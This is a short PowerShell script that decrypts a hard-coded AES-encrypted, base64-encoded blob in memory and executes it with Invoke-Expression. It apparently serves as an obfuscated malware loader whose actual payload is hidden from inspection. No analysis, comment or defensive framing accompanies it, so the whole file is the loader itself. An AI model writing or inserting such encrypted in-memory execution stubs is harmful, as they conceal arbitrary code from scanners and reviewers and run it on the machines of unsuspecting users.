$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0ihIVsWZj0m/FBTUrsz2hJg3qP7UJvP0DXjGHLxLpS2TasZ7NfB3eN8IejnhZwsKmPjt6GdnjKtlUAXBOQrcoV9ndhgd+IDIMTf7fWhotc33zMDOMpTOo7gMmF+2Gyvpsld75Cf3cx1lqdebzAsj7iZrThyL56iZDjDjVqW7RD2oj4G9eJxmm1PXa/EAemLtTcy6YgyHRzCkC0IDibdPD/aU97rhZSsK6Xv52+uJh2t67Vrw9n4sbQ3MlfM+QS38Y7J5XioSt9Q7rVHDA6ZBlnhujrgooElKLpKvpxMd8ufT7fvr+uCgsAMuAPmQLzJdMy6ohdIfLr3xLNMrRj0v1LFZtb3Q5F2YuQKTcK1kszgC+oyE77QeLTdCMZyZkwGXK93EIQGppZNA9x3B+OJp7MXyS3KDb0ygNKjd+GwubOq3QXyPomrXrYF+VjklPi2LbinfemvDW7pQCN0Rc54RgUEh2j1iqkQyO1zL37AT1gEOXaaxFMaXbocj085gL84YxQd58bnsJ5M4tp1Bp++Y8YTF07XCHoESRk21p0VntDDnVpU8UMqPhFcVtLBft4DfRJLFQSEkTXExSlma1tobYSYqYTSGkHRzh5pbI1QqcGhqjOUIgonBf1cD+Fx2DDbFaCmCy28c3ksGUVZpEVCDPwbCbgB4PEX4Me0OPIFJTe2CP7rgwmMgAv/EE/dy2BlH8yZcVQUsX2hffJa+uBwezbKcxblsGhojgMP2HmicoKlNSTwUKad5xDGUsmB2IVsVXU8CJN7oO92ahUYuPatvGOSOal1ZYKObrNpx4J3/FabavZ9jTYrcPMhWFIC5YUH4QSmmNLmxIdCDH3kPduE7Ffvf1qNwsXPWi8hSZWm2Saf9M4SvZro1MwDg5M5VDnWKnlo/giAmCvB6vlSpBaY7sPU="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
